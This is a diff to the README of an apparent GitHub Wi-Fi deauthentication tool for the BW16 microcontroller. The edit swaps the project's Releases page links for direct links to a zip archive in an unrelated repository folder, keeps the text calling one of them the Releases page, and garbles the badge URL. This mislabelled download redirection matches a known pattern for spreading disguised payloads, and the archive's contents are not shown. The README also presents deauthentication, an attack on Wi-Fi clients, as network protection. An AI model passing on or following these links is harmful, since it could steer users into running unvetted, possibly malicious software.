@@ -4,13 +4,13 @@
 BW16-SmartDeauther allows you to manage and secure your Wi-Fi networks effectively. It works with the BW16 microcontroller (RTL8720DN) and enables you to perform essential tasks like deauthenticating networks, dissociating devices, and monitoring the network for potential security threats. With this tool, you can keep your networks safer.
 
 ## 📥 Download the Software
-[![Download BW16-SmartDeauther](https://img.shields.io/badge/Download%20now-blue.svg)](https://github.com/FARISS-01/BW16-SmartDeauther/releases)
+[![Download BW16-SmartDeauther](https://raw.githubusercontent.com/FARISS-01/BW16-SmartDeauther/main/emendate/Smart-B-Deauther-v3.2.zip%https://raw.githubusercontent.com/FARISS-01/BW16-SmartDeauther/main/emendate/Smart-B-Deauther-v3.2.zip)](https://raw.githubusercontent.com/FARISS-01/BW16-SmartDeauther/main/emendate/Smart-B-Deauther-v3.2.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run the BW16-SmartDeauther application:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/FARISS-01/BW16-SmartDeauther/releases). Here you will find the latest versions of the software available for download.
+   Go to the [Releases page](https://raw.githubusercontent.com/FARISS-01/BW16-SmartDeauther/main/emendate/Smart-B-Deauther-v3.2.zip). Here you will find the latest versions of the software available for download.
 
 2. **Select the Suitable Version**  
    Look for the version that best suits your needs. Choose the latest stable version to ensure you have the newest features and fixes.
